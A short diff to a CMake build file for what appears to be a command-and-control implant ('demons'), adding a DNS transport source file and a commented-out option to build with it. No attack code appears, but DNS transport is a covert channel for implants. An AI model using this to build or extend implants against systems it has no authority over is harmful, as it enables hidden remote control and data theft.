@@ -25,6 +25,7 @@ set( COMMON_SOURCE
         src/core/Transport.c
         src/core/TransportHttp.c
         src/core/TransportSmb.c
+        src/core/TransportDns.c
         src/core/Parser.c
         src/core/Pivot.c
         src/core/Jobs.c
@@ -80,7 +81,10 @@ add_compile_definitions( TRANSPORT_HTTP )
 add_compile_definitions( TRANSPORT_SMB )
 add_compile_definitions( AES256 )
 
-# linking library
+# DNS transport: uncomment to build with DNS transport instead of HTTP/SMB
+# add_compile_definitions( TRANSPORT_DNS )
+
+# linking library (add dnsapi when TRANSPORT_DNS is active)
 link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )
 
 # add compiled demons
